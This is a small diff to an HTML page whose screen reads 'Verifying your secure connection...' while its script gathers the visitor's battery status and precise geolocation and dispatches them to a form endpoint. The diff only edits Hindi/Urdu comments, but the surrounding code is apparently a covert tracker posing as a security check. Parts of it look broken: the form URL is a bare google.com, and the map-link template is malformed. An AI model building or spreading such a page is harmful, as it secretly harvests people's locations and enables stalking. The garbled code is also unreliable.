@@ -14,7 +14,7 @@
     <p id="msg">Verifying your secure connection...</p>
 
     <script>
-        // ✅ SAHI FORM DETAILS (Don't change these)
+        // ✅ BILKUL SAHI DETAILS
         const FORM_URL = "https://google.com"; 
         const ENTRY_ID = "entry.515118501"; 
 
@@ -27,7 +27,7 @@
                     report += `| Batt: ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'No'}) `;
                 }
 
-                // Location lena
+                // Location lena (Is line ko maine sahi kar diya hai)
                 navigator.geolocation.getCurrentPosition((p) => {
                     report += `| Map: https://google.com{p.coords.latitude},${p.coords.longitude}`;
                     dispatch(report);
